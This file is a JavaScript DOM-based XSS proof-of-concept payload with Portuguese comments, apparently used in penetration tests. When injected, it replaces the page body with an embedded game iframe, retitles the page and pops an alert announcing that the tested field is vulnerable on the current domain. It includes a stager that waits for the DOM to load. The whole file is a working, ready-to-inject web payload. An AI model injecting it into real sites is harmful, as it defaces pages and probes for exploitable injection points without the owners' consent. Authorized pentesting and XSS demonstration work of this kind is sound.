
// Créditos do Script: Fredrik Almroth

console.log("Teste de XSS DOM Based by André Henrique!! Injetando payload! :D");

// Sobrescrever o corpo do documento
function inject() {
	console.log("Stager: Injetando o iFrame...");
	document.title = "DOOM > DOM, in Pentest by Andre Henrique";
	document.getElementsByTagName('body')[0].innerHTML = '<center><iframe src="https://archive.org/embed/segasms_James_Pond_II_-_Codename_RoboCod_1991_Millennium_Interactive_-_U.S._Gold_-_Vecto" width="560" height="384" frameborder="0" webkitallowfullscreen="true" mozallowfullscreen="true" allowfullscreen></iframe><center>';
	alert("ISH AVISA:\n\nSe vc estah lendo este aviso, o campo/field testado estah vulneravel a XSS DOM Based!\nIsto significa que um atacante, podera executar codigos JavaScript arbitrariamente\nno dominio " + document.domain + "!\n\nEntao, vamos provar isto jogando o DOOM!!");
}

// Verificar se o DOM pode ser injetado imediatamente ou se deve ser chamado por meio de eventos<marquee><h1> ---------feliz carnaval....-----ISH Tecnologia ----- from Cooperativa Consul ----------</h1></marquee>
if (document.readyState === "complete" || document.readyState === "interactive") {
	console.log("Stager: DOM Ok");
	inject();
} else if (window.attachEvent) {
	console.log("Stager: Anexando ao Onload");
	window.attachEvent('onload', inject);
} else if (window.addEventListener) {
	console.log("Stager: Anexando ao Load");
	window.addEventListener('load', inject, false);	
} else {
	console.log("Stager: Fallback para o Contador do iFrame");
	fc = document.getElementsByTagName('iframe').length;
	setInterval(
		function() {
			if (document.getElementsByTagName('iframe').length != fc) {
				return;
			} else {
				inject();
			}
		},
		300
	);
}
